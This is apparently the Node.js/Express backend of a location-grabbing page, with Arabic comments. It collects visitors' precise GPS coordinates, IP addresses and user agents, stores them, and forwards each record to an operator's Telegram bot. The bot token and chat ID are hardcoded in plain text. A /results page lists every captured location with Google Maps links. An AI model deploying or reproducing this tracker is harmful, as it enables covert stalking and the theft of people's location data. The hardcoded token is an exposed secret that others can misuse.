const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// إعدادات البوت (اضبطها حسب حاجتك)
const TELEGRAM_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y';
const TELEGRAM_CHAT_ID = '8391968596';

// Middleware
app.use(express.json());
app.use(express.static('.'));

// تخزين البيانات (يمكن استبداله بقاعدة بيانات)
let locations = [];

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// API لحفظ الموقع
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA'),
            date: new Date().toISOString()
        };
        
        // حفظ البيانات
        locations.push(locationData);
        console.log('📍 تم حفظ موقع GPS:', {
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            accuracy: locationData.accuracy,
            source: locationData.source || 'GPS'
        });
        
        // إرسال إشعار للتلجرام
        let telegramSent = false;
        if (TELEGRAM_TOKEN && TELEGRAM_CHAT_ID) {
            telegramSent = await sendTelegramNotification(locationData);
        }
        
        res.json({
            success: true,
            message: 'تم حفظ الموقع بنجاح',
            telegram_sent: telegramSent,
            data: locationData,
            total_locations: locations.length
        });
        
    } catch (error) {
        console.error('❌ خطأ في حفظ الموقع:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// دالة إرسال إشعار التلجرام
async function sendTelegramNotification(locationData) {
    try {
        const mapUrl = `https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}`;
        const message = `
📍 **موقع GPS جديد تم تحديده**

📌 **الإحداثيات:**
• خط العرض: ${locationData.latitude.toFixed(8)}°
• خط الطول: ${locationData.longitude.toFixed(8)}°

🎯 **الدقة:** ${Math.round(locationData.accuracy)} متر
📡 **المصدر:** ${locationData.source || 'GPS مباشر'}
⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
📱 **الجهاز:** ${locationData.userAgent?.substring(0, 50)}...

🗺️ [عرض على خرائط Google](${mapUrl})
        `;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: false
            })
        });
        
        const data = await response.json();
        return data.ok;
        
    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error.message);
        return false;
    }
}

// صفحة لعرض المواقع المسجلة
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; margin-top: 20px; }
                th, td { padding: 15px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #0c2461; color: white; }
                tr:hover { background: #2d2d4d; }
                .btn { background: #0c2461; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; margin: 10px; display: inline-block; }
                .gps-badge { background: #27ae60; color: white; padding: 3px 10px; border-radius: 12px; font-size: 12px; }
            </style>
        </head>
        <body>
            <h1>📊 المواقع المسجلة (${locations.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            
            ${locations.length === 0 ? `
                <div style="text-align: center; margin-top: 50px; padding: 40px; background: rgba(255,255,255,0.05); border-radius: 15px;">
                    <h3>📭 لا توجد مواقع مسجلة بعد</h3>
                    <p>سيتم عرض المواقع هنا عند تحديدها</p>
                </div>
            ` : `
                <table>
                    <tr>
                        <th>التاريخ</th>
                        <th>الإحداثيات</th>
                        <th>الدقة</th>
                        <th>المصدر</th>
                        <th>الخريطة</th>
                    </tr>
                    ${locations.slice().reverse().map(loc => `
                        <tr>
                            <td>${new Date(loc.date).toLocaleString('ar-SA')}</td>
                            <td>${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}</td>
                            <td>${Math.round(loc.accuracy)} متر</td>
                            <td><span class="gps-badge">${loc.source || 'GPS'}</span></td>
                            <td>
                                <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" 
                                   target="_blank" 
                                   style="color: #4a69bd; text-decoration: none;">
                                   🗺️ عرض
                                </a>
                            </td>
                        </tr>
                    `).join('')}
                </table>
            `}
        </body>
        </html>
    `);
});

// بدء الخادم
app.listen(PORT, () => {
    console.log(`
    ============================================
    🚀 نظام GPS الدقيق يعمل على المنفذ ${PORT}
    🌐 الرابط: http://localhost:${PORT}
    
    📡 النظام يستخدم GPS الحقيقي
    🛰️ لا يستخدم IP لتحديد الموقع
    📍 جاهز لتحديد المواقع بدقة عالية
    ============================================
    `);
});
